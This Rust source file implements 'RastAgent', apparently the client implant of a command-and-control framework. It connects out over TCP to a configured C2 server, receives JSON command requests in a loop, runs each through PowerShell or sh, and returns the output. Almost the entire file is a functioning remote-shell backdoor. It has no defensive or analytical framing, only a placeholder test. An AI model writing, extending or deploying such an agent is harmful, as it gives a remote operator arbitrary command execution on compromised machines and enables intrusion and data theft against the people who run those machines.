use std::{
    ops::DerefMut,
    sync::{Arc, RwLock},
};

use anyhow::{anyhow, Result};
use bytes::Bytes;
use commands::{Commands};
use futures_util::{sink::SinkExt, stream::StreamExt};
use rast::{
    messages::c2_agent::{AgentMessage, AgentResponse, C2Request},
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};
use tokio::{process::Command as SystemCommand, sync::Mutex};
use tokio_util::codec::BytesCodec;
use tracing::{info};

use crate::context::Context;

pub mod commands;
pub mod context;

pub struct RastAgent {
    settings: Settings,
    context: Arc<RwLock<Context>>,
    connection: Arc<Mutex<dyn ProtoConnection>>,
    commands: Commands,
}

impl RastAgent {
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let connection = if let Some(conf) = &settings.server.tcp {
            TcpFactory::new_client(conf).await
        } else {
            Err(anyhow!("Can't connect to C2 using TCP."))
        };

        Ok(RastAgent {
            settings,
            connection: connection.unwrap(),
            commands: Commands::new(),
            context: Arc::new(RwLock::new(Context::new())),
        })
    }

    pub async fn run(&mut self) -> Result<()> {
        info!("RastAgent running");

        let mut conn = self.connection.lock().await;
        let mut frame = get_rw_frame(conn.deref_mut(), BytesCodec::new());

        loop {
            if let Some(msg) = frame.next().await {
                let msg: AgentMessage = serde_json::from_slice(&msg.unwrap()).unwrap();
                info!("Request {:?}", msg);
                let AgentMessage::C2Request(C2Request::ExecCommand(cmd)) = msg else {
                    todo!()
                };

                let output = if cfg!(target_os = "windows") {
                    SystemCommand::new("powershell.exe")
                        .arg("-c")
                        .arg(cmd)
                        .output()
                        .await
                } else {
                    SystemCommand::new("sh").arg("-c").arg(cmd).output().await
                };

                info!("Response {:?}", output);
                let response = match output {
                    Ok(output) => String::from_utf8(output.stdout)?,
                    Err(e) => e.to_string(),
                };
                let response =
                    AgentMessage::AgentResponse(AgentResponse::CommandResponse(response));
                let response = serde_json::to_vec(&response).unwrap();
                let _result = frame.send(Bytes::from(response)).await;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
